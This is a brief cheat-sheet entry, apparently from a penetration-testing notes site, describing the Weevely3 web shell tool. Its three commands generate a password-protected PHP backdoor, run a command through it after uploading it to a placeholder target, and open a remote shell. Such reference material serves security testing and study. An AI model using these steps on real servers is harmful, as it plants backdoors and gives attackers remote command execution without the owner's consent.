---
title: Weevely3
desc: Weaponized web shell.
tags: [FileUpload, ReverseShell, Web]
alts: []
website: https://github.com/epinna/weevely3
render_with_liquid: false
---

## Basic Usage

```sh
# Generate backdoor with password (credential required)
weevely generate <password> ./shell.php

# Upload it to the target website adn execute commands
weevely https://vulnerable.com/upload/shell.php <password> whoami

# Get the shell
weevely https://vulnerable.com/upload/shell.php <password>
```